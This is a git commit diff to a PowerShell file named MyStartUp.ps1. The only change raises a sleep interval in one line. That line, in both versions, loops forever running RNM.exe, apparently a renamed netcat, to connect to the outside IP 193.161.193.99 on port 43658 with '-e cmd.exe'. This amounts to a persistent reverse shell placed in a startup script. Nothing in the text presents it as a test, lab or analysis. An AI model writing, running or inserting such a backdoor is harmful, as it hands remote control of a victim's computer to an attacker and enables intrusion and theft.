71a8f12250e7dad48df00e1c205e356881ce79bf
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-08-06 06:13:38 +0200

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,1 +1,1 @@
-while ($true) {C:\users\public\RNM.exe -nv 193.161.193.99 43658 -e cmd.exe ; Start-Sleep 8.4}
+while ($true) {C:\users\public\RNM.exe -nv 193.161.193.99 43658 -e cmd.exe ; Start-Sleep 14.4}
